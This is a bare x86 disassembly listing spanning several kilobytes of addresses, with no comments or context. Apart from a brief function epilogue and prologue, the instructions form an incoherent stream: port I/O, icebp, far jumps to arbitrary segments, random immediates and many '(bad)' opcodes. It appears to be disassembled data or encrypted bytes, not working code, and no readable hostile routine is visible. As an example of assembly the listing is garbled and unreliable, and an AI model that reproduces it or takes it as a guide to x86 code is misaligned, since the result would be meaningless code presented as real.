  4057b3:	add    ebx,DWORD PTR [eax-0x7c1c3b4c]
  4057b9:	call   0x411:0x70ffc11f
  4057c0:	or     bl,BYTE PTR [ebp+0x5a2eba3e]
  4057c6:	in     eax,0xc0
  4057c8:	xchg   cl,bh
  4057ca:	add    DWORD PTR [ecx],esi
  4057cc:	data16 js 0x405778
  4057cf:	mov    al,ds:0x899ec4a2
  4057d4:	pop    es
  4057d5:	icebp  
  4057d6:	sar    DWORD PTR ds:0x5231fd5,cl
  4057dc:	jmp    0x40579f
  4057de:	jne    0x4057fc
  4057e0:	jb     0x4057ff
  4057e2:	or     BYTE PTR [eax+edx*8+0x284574f4],ah
  4057e9:	jae    0x4057c4
  4057eb:	stos   DWORD PTR es:[edi],eax
  4057ec:	in     al,0x14
  4057ee:	and    DWORD PTR [eax-0x186f6ba5],edi
  4057f4:	jnp    0x40581c
  4057f6:	call   0xcf0253e0
  4057fb:	mov    ebp,0xc11271e0
  405800:	addr16 push ebp
  405802:	stos   DWORD PTR es:[edi],eax
  405803:	push   esi
  405804:	in     eax,0xa7
  405806:	add    edx,0x6ba1ddda
  40580c:	or     BYTE PTR [edi+0x106402e7],al
  405812:	and    esp,DWORD PTR [edx+0x0]
  405815:	clc    
  405816:	or     esp,DWORD PTR [edi+0x7a]
  405819:	cmp    edi,DWORD PTR [ecx+0x5bed90f2]
  40581f:	cmc    
  405820:	icebp  
  405821:	inc    esi
  405822:	daa    
  405823:	loop   0x405855
  405825:	retf   0x84d7
  405828:	out    dx,al
  405829:	xor    DWORD PTR [ecx],edx
  40582b:	mov    edx,0x4eb6d3f7
  405830:	dec    esp
  405831:	pop    ebx
  405832:	dec    esi
  405833:	adc    DWORD PTR ds:0x4e4c02a,esi
  405839:	lods   eax,DWORD PTR ds:[esi]
  40583a:	xchg   esp,eax
  40583b:	adc    edi,DWORD PTR [edi-0x1d73eeed]
  405841:	fst    DWORD PTR [eax]
  405843:	imul   eax,DWORD PTR [ebx],0x53acafbe
  405849:	ins    DWORD PTR es:[edi],dx
  40584a:	ja     0x4058a7
  40584c:	sbb    eax,0x149d848
  405851:	iret   
  405852:	clc    
  405853:	xor    al,0xb9
  405855:	pop    eax
  405856:	ss pop ebx
  405858:	sbb    al,0x1f
  40585a:	push   0x698920d
  40585f:	xchg   edi,eax
  405860:	leave  
  405861:	ins    BYTE PTR es:[edi],dx
  405862:	in     eax,dx
  405863:	mov    dh,0x9e
  405865:	pop    edx
  405866:	into   
  405867:	and    eax,0x7966c92b
  40586c:	or     DWORD PTR [edi],edi
  40586e:	and    bl,bl
  405870:	es dec ebp
  405872:	fidiv  DWORD PTR [eax]
  405874:	inc    ebp
  405875:	cmp    esi,DWORD PTR [eax+edx*2+0x1f137618]
  40587c:	push   edx
  40587d:	cli    
  40587e:	in     al,dx
  40587f:	sbb    eax,0xcfca39ac
  405884:	adc    ebp,DWORD PTR [ebx]
  405886:	mov    esp,0x277c7a3a
  40588b:	cwde   
  40588c:	xchg   esp,eax
  40588d:	dec    edi
  40588e:	cmp    al,0x7f
  405890:	adc    edi,DWORD PTR [esi]
  405892:	add    BYTE PTR [ebx+0x4815bb00],bl
  405898:	es inc ebp
  40589a:	(bad)  
  40589b:	xchg   esp,eax
  40589c:	and    bl,BYTE PTR [ecx]
  40589e:	js     0x405831
  4058a0:	jmp    0xc938:0x34d3429c
  4058a7:	jmp    0x2cff:0x57cb9b85
  4058ae:	imul   esi,DWORD PTR [edi-0x5a],0xffffff84
  4058b2:	out    0x45,eax
  4058b4:	push   0x20042e47
  4058b9:	div    BYTE PTR [ecx+0x65]
  4058bc:	jb     0x4058bb
  4058be:	xor    eax,0x351ed18
  4058c3:	cs pushw ds
  4058c6:	(bad)  
  4058c7:	jo     0x405918
  4058c9:	cwde   
  4058ca:	and    DWORD PTR [ecx+0x385a4f0f],eax
  4058d0:	adc    eax,0x2cd6d105
  4058d5:	mov    esp,0x5012ca5c
  4058da:	div    BYTE PTR [edx+ebp*2-0x60]
  4058de:	mov    ah,0xff
  4058e0:	(bad)  
  4058e1:	and    edx,DWORD PTR [edi-0x330ce3b9]
  4058e7:	je     0x4058a5
  4058e9:	scas   al,BYTE PTR es:[edi]
  4058ea:	(bad)  
  4058eb:	std    
  4058ec:	in     al,0xe8
  4058ee:	xchg   edi,eax
  4058ef:	les    edx,FWORD PTR [ecx+0x69]
  4058f2:	(bad)  [ecx+edx*8-0x8]
  4058f6:	data16 ins BYTE PTR es:[edi],dx
  4058f8:	jl     0x4058da
  4058fa:	js     0x4058a7
  4058fc:	enter  0x24a8,0x1d
  405900:	jno    0x4058f3
  405902:	shl    DWORD PTR [ecx+0x69],0x96
  405906:	push   0xffffff8f
  405908:	mov    al,ds:0x31787b8f
  40590d:	nop
  40590e:	adc    eax,0xb238fa4e
  405913:	das    
  405914:	fst    DWORD PTR [ebx]
  405916:	inc    eax
  405917:	pop    ecx
  405918:	sbb    BYTE PTR [esi],0x35
  40591b:	add    al,BYTE PTR [edx]
  40591d:	jecxz  0x4058e6
  40591f:	sbb    BYTE PTR [ebx+0x1c],ah
  405922:	fldcw  WORD PTR [esi+eiz*2+0x7d]
  405926:	push   cs
  405927:	xor    eax,0xd84b1397
  40592c:	outs   dx,DWORD PTR ds:[esi]
  40592d:	dec    ax
  40592f:	rcr    DWORD PTR [ecx+0x16],0xf4
  405933:	aam    0x35
  405935:	and    eax,0x729bcae
  40593a:	dec    ebp
  40593b:	adc    BYTE PTR [ebx],cl
  40593d:	and    esi,DWORD PTR [ecx]
  40593f:	lds    esi,FWORD PTR [esi+ebp*2]
  405942:	mov    edx,0xf5e165de
  405947:	or     esp,DWORD PTR [ebp-0x52]
  40594a:	xlat   BYTE PTR ds:[ebx]
  40594b:	add    al,0xb8
  40594d:	hlt    
  40594e:	mov    ebx,0x3accb9d4
  405953:	pop    esp
  405954:	mov    ch,0xd5
  405956:	adc    dl,BYTE PTR [esi+edi*1]
  405959:	mov    ah,0x1f
  40595b:	lods   eax,DWORD PTR ds:[esi]
  40595c:	hlt    
  40595d:	sub    ah,BYTE PTR [edx+0x4d]
  405960:	adc    BYTE PTR [ecx],bl
  405962:	mov    ebp,0x48e206ad
  405967:	(bad)  
  405968:	mov    esp,0x378035ae
  40596d:	jecxz  0x4059d4
  40596f:	dec    edx
  405970:	and    DWORD PTR [edx-0x60],edi
  405973:	push   eax
  405974:	or     al,0x55
  405976:	sub    dl,BYTE PTR [ebp+edx*8-0x7d]
  40597a:	aas    
  40597b:	stos   DWORD PTR es:[edi],eax
  40597c:	test   DWORD PTR [ebp-0x2b],esi
  40597f:	ja     0x405923
  405981:	addr16 cld 
  405983:	xor    eax,0xd732657d
  405988:	xchg   esp,eax
  405989:	push   esp
  40598a:	loop   0x405979
  40598c:	das    
  40598d:	adc    BYTE PTR [ecx],cl
  40598f:	mov    edx,0x3638b74c
  405994:	sub    DWORD PTR [ebp+0x7e70957],ecx
  40599a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40599b:	fcom   DWORD PTR [esi]
  40599d:	mov    ds:0xe6537073,eax
  4059a2:	movsx  eax,WORD PTR [eax-0x44ff6427]
  4059a9:	into   
  4059aa:	out    0xfb,al
  4059ac:	pushf  
  4059ad:	iret   
  4059ae:	call   0x424c:0x2fd19b09
  4059b5:	mov    ebx,0x93b9ca55
  4059ba:	push   ecx
  4059bb:	cwde   
  4059bc:	mov    ah,0xae
  4059be:	call   0xe89f3123
  4059c3:	into   
  4059c4:	jno    0x4059ac
  4059c6:	mov    eax,ds:0x4c93eb3e
  4059cb:	repnz cmc 
  4059cd:	retf   0x695c
  4059d0:	loop   0x4059d5
  4059d2:	mov    bh,0xdc
  4059d4:	lods   al,BYTE PTR ds:[esi]
  4059d5:	gs cmc 
  4059d7:	dec    ecx
  4059d8:	cli    
  4059d9:	popf   
  4059da:	data16 repnz mov dl,0x76
  4059de:	add    ah,BYTE PTR [edi+0x4ab4852e]
  4059e4:	mov    ah,0xbc
  4059e6:	fimul  WORD PTR [ebp+eax*2+0x18]
  4059ea:	lods   eax,DWORD PTR ds:[esi]
  4059eb:	mov    esi,0xb9bf4a39
  4059f0:	jge    0x4059f5
  4059f2:	jne    0x405a04
  4059f4:	cmp    edx,esi
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x405a9f
  405a20:	dec    esp
  405a21:	pop    ds
  405a22:	mov    cl,0x67
  405a24:	cmp    BYTE PTR [eax+0x78],bh
  405a27:	dec    ebp
  405a28:	jle    0x405aa2
  405a2a:	js     0x405a74
  405a2c:	fnstsw WORD PTR [ebp+esi*4+0x14344524]
  405a33:	add    al,0x6d
  405a35:	call   0xa9d4a38
  405a3a:	stos   BYTE PTR es:[edi],al
  405a3b:	aas    
  405a3c:	lds    eax,FWORD PTR [ebp-0x48]
  405a3f:	mov    ch,0x5
  405a41:	inc    edi
  405a42:	leave  
  405a43:	ror    ah,1
  405a45:	mov    dl,0xfc
  405a47:	leave  
  405a48:	jl     0x405a03
  405a4a:	repz loope 0x4059f7
  405a4d:	out    dx,al
  405a4e:	fistp  WORD PTR [eax-0x699de70f]
  405a54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a55:	or     DWORD PTR [ebx-0x7075ae57],esi
  405a5b:	dec    ecx
  405a5c:	hlt    
  405a5d:	mov    esp,0x954d7a26
  405a62:	sbb    ah,al
  405a64:	inc    edi
  405a65:	jno    0x405a28
  405a67:	icebp  
  405a68:	daa    
  405a69:	push   es
  405a6a:	push   eax
  405a6b:	leave  
  405a6c:	adc    eax,0x67bc8fef
  405a71:	(bad)  
  405a72:	out    0x67,eax
  405a74:	loop   0x405a05
  405a76:	mov    edi,0xd8ba752f
  405a7b:	xlat   BYTE PTR ds:[ebx]
  405a7c:	mov    DWORD PTR [ebx+0x60aac2da],esp
  405a82:	pushf  
  405a83:	(bad)  
  405a84:	rol    DWORD PTR [ebx+0x310b25c2],1
  405a8a:	add    esp,DWORD PTR [edi-0x39]
  405a8d:	xor    al,0x85
  405a90:	pop    ebx
  405a91:	data16 fisttp DWORD PTR [ebx-0x413e8c06]
  405a98:	lods   al,BYTE PTR ds:[esi]
  405a99:	imul   BYTE PTR [ebx-0x56]
  405a9c:	and    eax,DWORD PTR [ebx]
  405a9e:	mov    cl,0x2c
  405aa0:	scas   eax,DWORD PTR es:[edi]
  405aa1:	pop    ds
  405aa2:	xchg   ebx,eax
  405aa3:	jb     0x405b09
  405aa5:	dec    edi
  405aa6:	jle    0x405aa3
  405aa8:	out    dx,eax
  405aa9:	jae    0x405b21
  405aab:	mov    ebx,0xf6346d1e
  405ab0:	dec    ecx
  405ab1:	out    0x16,eax
  405ab3:	xchg   esp,eax
  405ab4:	jb     0x405b29
  405ab6:	adc    eax,0xeaa185ce
  405abb:	cld    
  405abc:	cmp    ah,ch
  405abe:	push   ecx
  405abf:	stos   DWORD PTR es:[edi],eax
  405ac0:	sbb    DWORD PTR [eax],0xc82c8010
  405ac6:	rcl    BYTE PTR [edx+0x4d3f1abd],cl
  405acc:	(bad)  
  405acd:	daa    
  405ace:	out    dx,eax
  405acf:	mov    ds:0xee38155d,al
  405ad4:	repz sub al,0x7c
  405ad7:	(bad)  
  405ad8:	inc    BYTE PTR [ecx+edx*4+0x784965d6]
  405adf:	out    0xa1,al
  405ae1:	lock loopne 0x405b08
  405ae4:	cmc    
  405ae5:	pop    ss
  405ae6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ae7:	pop    esi
  405ae8:	xlat   BYTE PTR ds:[ebx]
  405ae9:	sub    BYTE PTR [ebp-0x3e9995e7],0xcd
  405af0:	xchg   edx,eax
  405af1:	bound  ebp,QWORD PTR [esi+0x2a7088f5]
  405af7:	mov    ds:0xdabbe744,al
  405afc:	ror    BYTE PTR [edi],cl
  405afe:	sbb    al,0xa4
  405b00:	jmp    0x405b5d
  405b02:	out    0xd2,al
  405b04:	inc    BYTE PTR [edx+0x4a15aa77]
  405b0a:	xchg   ebx,eax
  405b0b:	imul   eax,DWORD PTR [edi+0x2c],0x5532700
  405b12:	jne    0x405ad8
  405b14:	xchg   DWORD PTR [eax+0x6d],edi
  405b17:	sub    al,al
  405b19:	retf   0x7a09
  405b1c:	dec    ebp
  405b1d:	test   BYTE PTR [ebx],bl
  405b1f:	mov    ah,0xb2
  405b21:	and    BYTE PTR [esi],bh
  405b23:	cmp    bh,BYTE PTR [eax+0x46]
  405b26:	push   0xffffff89
  405b28:	jns    0x405aba
  405b2a:	add    eax,0x9dbfd38c
  405b2f:	inc    ecx
  405b30:	pop    eax
  405b31:	add    eax,0x795756a8
  405b36:	adc    BYTE PTR [esi-0x80],0xef
  405b3a:	call   0xbeaf7a4f
  405b3f:	fidivr DWORD PTR [ebp-0x7cf2397]
  405b45:	in     eax,dx
  405b46:	je     0x405b16
  405b48:	push   eax
  405b49:	rcl    DWORD PTR [edx],0xb6
  405b4c:	sbb    edx,DWORD PTR [ecx+0x3fa948a8]
  405b52:	or     BYTE PTR [ebx-0x79],dl
  405b55:	mov    ecx,0xce4f8d8c
  405b5a:	jo     0x405b68
  405b5c:	push   ds
  405b5d:	dec    esp
  405b5e:	mov    WORD PTR [edi-0x62],fs
  405b61:	mov    ds:0x6ff6d61c,al
  405b66:	(bad)  
  405b67:	sub    al,ah
  405b69:	or     cl,dh
  405b6b:	push   ebp
  405b6c:	sub    al,0x1b
  405b6e:	mov    es:0xf53bf5c3,eax
  405b74:	aas    
  405b75:	inc    edx
  405b76:	scas   al,BYTE PTR es:[edi]
  405b77:	scas   al,BYTE PTR es:[edi]
  405b78:	mov    cl,BYTE PTR [edx+0x14e9f1fb]
  405b7e:	and    DWORD PTR [edx+0x1c],edx
  405b81:	sub    edx,esi
  405b83:	inc    edi
  405b84:	xor    eax,0x6407f37c
  405b89:	fiadd  WORD PTR [ebx-0x5f]
  405b8c:	(bad)  
  405b8d:	popf   
  405b8e:	sti    
  405b8f:	popa   
  405b90:	jmp    0x5eac:0xcc6f92c
  405b97:	out    0x8,eax
  405b99:	icebp  
  405b9a:	scas   eax,DWORD PTR es:[edi]
  405b9b:	inc    esp
  405b9c:	ins    BYTE PTR es:[edi],dx
  405b9d:	ins    DWORD PTR es:[edi],dx
  405b9e:	mov    ah,0x57
  405ba0:	repz es jg 0x405c01
  405ba4:	push   ecx
  405ba5:	rcr    DWORD PTR [edx+ebp*4],0x68
  405ba9:	test   al,0xd6
  405bab:	bound  ebp,QWORD PTR [esp]
  405bae:	pop    esi
  405baf:	iret   
  405bb0:	repnz mov ebp,0xd85eec39
  405bb6:	dec    DWORD PTR [eax+0x10]
  405bb9:	(bad)  
  405bba:	sub    eax,0x6b36c2ed
  405bbf:	jnp    0x405bbc
  405bc1:	pusha  
  405bc2:	icebp  
  405bc3:	mov    ds:0xb58fcc96,eax
  405bc8:	pusha  
  405bc9:	ins    BYTE PTR es:[edi],dx
  405bca:	sbb    bh,al
  405bcc:	inc    ecx
  405bcd:	pop    ebx
  405bce:	push   edi
  405bcf:	iret   
  405bd0:	mov    dl,0xd8
  405bd2:	retf   
  405bd3:	iret   
  405bd4:	push   es
  405bd5:	outs   dx,DWORD PTR ds:[esi]
  405bd6:	stos   DWORD PTR es:[edi],eax
  405bd7:	add    DWORD PTR [eax+0xe],ebp
  405bda:	dec    ebx
  405bdb:	mov    dh,0x89
  405bdd:	call   0x1553dd24
  405be2:	dec    ebx
  405be3:	xor    ch,BYTE PTR [ebx+0x61a4dd49]
  405be9:	and    BYTE PTR [esi],ch
  405beb:	out    dx,al
  405bec:	xor    eax,DWORD PTR [eax+ebx*8]
  405bef:	popa   
  405bf0:	mov    ebp,0x1203718a
  405bf5:	test   ebp,0xe36357da
  405bfb:	jp     0x405bfe
  405bfd:	cwde   
  405bfe:	popw   ss
  405c00:	out    dx,al
  405c01:	hlt    
  405c02:	jp     0x405bec
  405c04:	sbb    BYTE PTR [ecx+ebp*2+0x53],ah
  405c08:	xchg   esi,eax
  405c09:	pop    ss
  405c0a:	test   dl,0x3b
  405c0d:	dec    esp
  405c0e:	jle    0x405bbe
  405c10:	mov    dh,0x62
  405c12:	nop
  405c13:	push   0x836175d2
  405c18:	retf   
  405c19:	jb     0x405c81
  405c1b:	sbb    ecx,ecx
  405c1d:	add    eax,0x1089e450
  405c22:	lahf   
  405c23:	mov    DWORD PTR [edx-0x21392bf9],0xc8f5121d
  405c2d:	retf   0xebd7
  405c30:	imul   edi,DWORD PTR [edi+ebp*1],0x5c
  405c34:	xor    DWORD PTR [esi+0x4b85797c],0xffffffe8
  405c3b:	inc    ebp
  405c3c:	inc    ecx
  405c3d:	ror    BYTE PTR [edi],0xbd
  405c40:	pop    ds
  405c41:	jne    0x405c79
  405c43:	mov    eax,0xe63fc25c
  405c48:	stos   BYTE PTR es:[edi],al
  405c49:	adc    BYTE PTR [eax+ecx*8+0x29],dl
  405c4d:	outs   dx,DWORD PTR ds:[esi]
  405c4e:	clc    
  405c4f:	je     0x405cc9
  405c51:	xlat   BYTE PTR ds:[ebx]
  405c52:	push   es
  405c53:	push   ss
  405c54:	pop    ebx
  405c55:	jmp    0x4e2f:0xc728da0f
  405c5c:	and    eax,0xabe60df2
  405c61:	jbe    0x405c21
  405c63:	push   ecx
  405c64:	jmp    0x69fa:0x3b74a4d2
  405c6b:	push   ebx
  405c6c:	lods   eax,DWORD PTR ds:[esi]
  405c6d:	and    cl,ah
  405c6f:	mov    eax,0x8efd62f3
  405c74:	repnz push ebx
  405c76:	mov    ch,0xf1
  405c78:	and    eax,0x179bcff0
  405c7d:	cmp    dl,dh
  405c7f:	sbb    eax,0x861a7b21
  405c84:	add    BYTE PTR [ecx],dl
  405c86:	in     al,dx
  405c87:	call   0x484eecc9
  405c8c:	sub    DWORD PTR [edx+ebx*2-0x60],0xffffffa2
  405c91:	adc    DWORD PTR [ebx+0x33],edi
  405c94:	mov    eax,ds:0x4579b685
  405c99:	xor    dh,BYTE PTR [esi-0x53]
  405c9c:	icebp  
  405c9d:	add    DWORD PTR [ecx+0x27],edi
  405ca0:	stc    
  405ca1:	jae    0x405ca9
  405ca3:	repz jl 0x405c3e
  405ca6:	test   ebx,edi
  405ca8:	ror    eax,0xe4
  405cab:	jbe    0x405caa
  405cad:	cmovae esi,eax
  405cb0:	sub    dh,BYTE PTR [eax-0x61d78fec]
  405cb6:	or     al,0xe8
  405cb8:	aad    0x2c
  405cba:	pop    ss
  405cbb:	icebp  
  405cbc:	inc    esi
  405cbd:	inc    esi
  405cbe:	fs pop ecx
  405cc0:	xchg   DWORD PTR [di],esi
  405cc3:	or     dh,bh
  405cc5:	cmp    ebx,ebp
  405cc7:	mov    ah,0xd1
  405cc9:	jae    0x405cf8
  405ccb:	repnz add ecx,DWORD PTR [ebx-0x5f]
  405ccf:	sti    
  405cd0:	(bad)
  405cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cd5:	mov    bh,0xbb
  405cd7:	xlat   BYTE PTR ds:[ebx]
  405cd8:	jns    0x405c97
  405cda:	inc    ebp
  405cdb:	out    dx,al
  405cdc:	sub    edx,ebx
  405cde:	es ret 
  405ce0:	push   esi
  405ce1:	lea    ebx,[edx-0x2bedbd02]
  405ce7:	fisttp WORD PTR [esi-0x67f5b108]
  405ced:	pop    ecx
  405cee:	mov    ch,0x4
  405cf0:	xchg   ebp,eax
  405cf1:	dec    ebx
  405cf2:	rcl    DWORD PTR [edx],cl
  405cf4:	es mov edi,db2
  405cf8:	ins    BYTE PTR es:[edi],dx
  405cf9:	or     dl,BYTE PTR [ebx+0x49]
  405cfc:	(bad)  
  405cfd:	arpl   WORD PTR [ebx],si
  405cff:	shr    cl,cl
  405d01:	jmp    0x405d05
  405d03:	add    BYTE PTR [eax],al
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0xb3254c09
  405d13:	ret    
  405d14:	dec    ebp
  405d15:	mov    ah,0x3d
  405d17:	js     0x405d91
  405d19:	dec    ebp
  405d1a:	jle    0x405d94
  405d1c:	js     0x405cab
  405d1e:	push   0x527e02c0
  405d23:	pusha  
  405d24:	div    DWORD PTR [edi]
  405d26:	in     al,0xb4
  405d28:	fwait
  405d29:	les    eax,FWORD PTR [ebp+0x70]
  405d2c:	add    ebp,DWORD PTR [ebx-0x67]
  405d2f:	jmp    0x405d6f
  405d31:	enter  0xc032,0xc
  405d35:	mov    esi,ds
  405d37:	pop    edx
  405d38:	cmc    
  405d39:	(bad)  
  405d3a:	sbb    esp,DWORD PTR [eax]
  405d3c:	pop    ds
  405d3d:	add    dl,ch
  405d3f:	cld    
  405d40:	jae    0x405cf4
  405d42:	ds shl ecx,0xf
  405d46:	sub    BYTE PTR gs:[ecx-0x73a44c18],0x8d
  405d4e:	call   0x33d4c919
  405d53:	scas   eax,DWORD PTR es:[edi]
  405d54:	fwait
  405d55:	xor    ebp,esi
  405d57:	pop    esp
  405d58:	dec    edx
  405d59:	loop   0x405d61
  405d5b:	mov    dl,0xca
  405d5d:	xor    DWORD PTR [ebp+0x1f4b40b3],ebx
  405d63:	stc    
  405d64:	sti    
  405d65:	out    0xf0,al
  405d67:	aas    
  405d68:	leave  
  405d69:	ins    BYTE PTR es:[edi],dx
  405d6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d6b:	scas   eax,DWORD PTR es:[edi]
  405d6c:	xchg   al,dh
  405d6e:	fstp   TBYTE PTR [edi+0x1ad2e834]
  405d74:	and    eax,0xf3d87a7f
  405d79:	pop    ebp
  405d7a:	sub    ebx,DWORD PTR [ecx+eax*4]
  405d7d:	enter  0xad49,0xa
  405d81:	int3   
  405d82:	jge    0x405dcb
  405d84:	xlat   BYTE PTR ds:[ebx]
  405d85:	call   0x20ed1bfd
  405d8a:	lahf   
  405d8b:	mov    ecx,0x154746b4
  405d90:	adc    DWORD PTR [ebx+0x50],ebp
  405d93:	pop    esp
  405d94:	adc    cl,ch
  405d96:	jecxz  0x405e0d
  405d98:	cwde   
  405d99:	lods   al,BYTE PTR ds:[esi]
  405d9a:	sbb    eax,0x58ef5448
  405d9f:	ret    
  405da0:	xchg   esp,eax
  405da1:	mov    ecx,0x93727e59
  405da6:	bnd jle 0x405e01
  405da9:	mov    bl,0x2a
  405dab:	lock xor DWORD PTR [ebx-0x5b],ebx
  405daf:	fild   DWORD PTR [edi+0x40]
  405db2:	test   BYTE PTR [ecx+ebp*1],cl
  405db5:	retf   
  405db6:	in     eax,dx
  405db7:	lods   eax,DWORD PTR ds:[esi]
  405db8:	cmp    DWORD PTR [edi+0x529d7e49],esi
  405dbe:	in     al,0x8c
  405dc0:	jbe    0x405dee
  405dc2:	stc    
  405dc3:	push   cs
  405dc4:	add    cl,ah
  405dc6:	cmp    edx,edi
  405dc8:	mov    eax,0xfcedc7ba
  405dcd:	or     esi,esp
  405dcf:	lods   eax,DWORD PTR ds:[esi]
  405dd0:	or     BYTE PTR [ebp-0x1505c432],0xe9
  405dd7:	(bad)  
  405dd8:	outs   dx,BYTE PTR ds:[esi]
  405dd9:	inc    ebx
  405dda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ddb:	mov    dl,0x68
  405ddd:	std    
  405dde:	add    eax,0x305cfed7
  405de3:	lods   eax,DWORD PTR ds:[esi]
  405de4:	push   ebp
  405de5:	inc    ecx
  405de6:	scas   eax,DWORD PTR es:[edi]
  405de7:	mov    bh,0x7
  405de9:	xchg   ecx,eax
  405dea:	jg     0x405e41
  405dec:	sbb    BYTE PTR [edx],bh
  405dee:	cmp    edx,DWORD PTR [esi+0x2a]
  405df1:	cmp    dh,bl
  405df3:	cmp    esi,DWORD PTR [ebp-0x76]
  405df6:	outs   dx,DWORD PTR ds:[esi]
  405df7:	pop    edi
  405df8:	(bad)  [eax+0x69]
  405dfb:	ficomp WORD PTR [esi-0x43]
  405dfe:	xchg   edx,eax
  405dff:	dec    eax
  405e00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e01:	mov    ds:0x7decc7c2,eax
  405e06:	js     0x405e23
  405e08:	retf   0x4b6e
  405e0b:	stos   DWORD PTR es:[edi],eax
  405e0c:	add    eax,0x2240f1d2
  405e11:	xor    eax,0xf56e2d06
  405e16:	lods   al,BYTE PTR ds:[esi]
  405e17:	xchg   edx,eax
  405e18:	mov    ebp,0x3a03bc6f
  405e1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e1e:	add    bh,BYTE PTR [ebp-0x46]
  405e21:	pop    edx
  405e22:	leave  
  405e23:	ins    BYTE PTR es:[edi],dx
  405e24:	jo     0x405e0b
  405e26:	(bad)  
  405e27:	cld    
  405e28:	pop    es
  405e29:	retf   0x1dec
  405e2c:	cmc    
  405e2d:	and    DWORD PTR [ebp-0x23],0xffffffed
  405e31:	fidivr WORD PTR [eax+0x6e]
  405e34:	cmc    
  405e35:	in     eax,dx
  405e36:	stos   BYTE PTR es:[edi],al
  405e37:	test   esp,edi
  405e39:	orps   xmm1,XMMWORD PTR [esi+edi*1]
  405e3d:	or     ah,BYTE PTR [esi]
  405e3f:	mov    BYTE PTR [edx+0x3ecbf4cc],ch
  405e45:	(bad)  
  405e46:	jp     0x405e60
  405e48:	popf   
  405e49:	loop   0x405df6
  405e4b:	add    esp,0x3315f5a0
  405e51:	mov    bl,bh
  405e53:	push   ss
  405e54:	gs jmp 0xe958:0xff2a045e
  405e5c:	push   es
  405e5d:	adc    ah,BYTE PTR ds:0x13eb8b8e
  405e63:	imul   edi,DWORD PTR [edi-0x1d476190],0xf7e9bbc4
  405e6d:	ret    
  405e6e:	out    0x69,al
  405e70:	rcr    ecx,1
  405e72:	fist   WORD PTR [esi+eax*1+0x27]
  405e76:	xor    al,0x48
  405e78:	fsubr  st,st(0)
  405e7a:	pushf  
  405e7b:	gs aad 0xaa
  405e7e:	pop    ss
  405e7f:	jbe    0x405e39
  405e81:	jae    0x405e63
  405e83:	ds inc edi
  405e85:	popa   
  405e86:	jbe    0x405ea7
  405e88:	int    0xfe
  405e8a:	(bad)  
  405e8b:	pop    ss
  405e8c:	sbb    eax,DWORD PTR [ebx-0x1d517550]
  405e92:	xor    bl,BYTE PTR [ebp-0x67b4b6e5]
  405e98:	add    eax,0x1169f071
  405e9d:	xchg   ebp,eax
  405e9e:	fdivr  st,st(2)
  405ea0:	add    eax,0x9bd1da33
  405ea5:	sub    al,0x9b
  405ea7:	(bad)  
  405ea8:	out    dx,al
  405ea9:	in     eax,0x1e
  405eab:	into   
  405eac:	push   ss
  405ead:	jp     0x405ec3
  405eaf:	xchg   edx,eax
  405eb0:	rcr    DWORD PTR [edx],1
  405eb2:	loopne 0x405e93
  405eb4:	jmp    0x4f2b:0xe74c618c
  405ebb:	in     eax,0x3e
  405ebd:	iret   
  405ebe:	(bad)  
  405ebf:	clc    
  405ec0:	or     dh,BYTE PTR [ebx-0x47]
  405ec3:	or     BYTE PTR [eax],al
  405ec5:	int    0x40
  405ec7:	mov    al,0xba
  405ec9:	test   eax,0x33fd66c7
  405ece:	hlt    
  405ecf:	or     BYTE PTR [ebp+ecx*1+0x6a],ah
  405ed3:	push   es
  405ed4:	aad    0x24
  405ed6:	sbb    BYTE PTR ds:0x5864b8cc,0x8e
  405edd:	push   ecx
  405ede:	push   ss
  405edf:	inc    esp
  405ee0:	jae    0x405eff
  405ee2:	ret    
  405ee3:	sub    dh,BYTE PTR [eax]
  405ee5:	aaa    
  405ee6:	pop    ds
  405ee7:	shr    DWORD PTR [edx],1
  405ee9:	lock cwde 
  405eeb:	pop    edi
  405eec:	dec    eax
  405eed:	sbb    ebp,DWORD PTR [ecx]
  405eef:	dec    edi
  405ef0:	mov    ch,0x4b
  405ef2:	push   esi
  405ef3:	push   esi
  405ef4:	ret    0x9bea
  405ef7:	dec    esi
  405ef8:	lods   eax,DWORD PTR ds:[esi]
  405ef9:	xor    dl,BYTE PTR [esi]
  405efb:	(bad)  
  405efc:	leave  
  405efd:	sbb    edi,DWORD PTR [eax-0x683efe5b]
  405f03:	cmp    edi,DWORD PTR [edx-0x72]
  405f06:	aas    
  405f07:	scas   eax,DWORD PTR es:[edi]
  405f08:	paddusw mm7,QWORD PTR [eax-0x70]
  405f0c:	jmp    0x405ede
  405f0e:	cmp    BYTE PTR [ecx+0x4f],bl
  405f11:	jge    0x405f6f
  405f13:	inc    ecx
  405f14:	lods   eax,DWORD PTR ds:[esi]
  405f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f16:	mov    esp,0xe6aa894a
  405f1b:	(bad)  
  405f1c:	lods   eax,DWORD PTR ds:[esi]
  405f1d:	push   ecx
  405f1e:	adc    DWORD PTR [edx+0x11],eax
  405f21:	add    edx,DWORD PTR [ebp-0x1d]
  405f24:	xlat   BYTE PTR ds:[ebx]
  405f25:	xchg   ebx,eax
  405f26:	xchg   ecx,eax
  405f27:	xchg   dl,cl
  405f29:	mov    ah,0x68
  405f2b:	jl     0x405ed1
  405f2d:	retf   0x1385
  405f30:	scas   al,BYTE PTR es:[edi]
  405f31:	add    eax,0xd1c10a2d
  405f36:	fidivr WORD PTR [ecx+eiz*4-0x6fa0d411]
  405f3d:	adc    bh,BYTE PTR [eax]
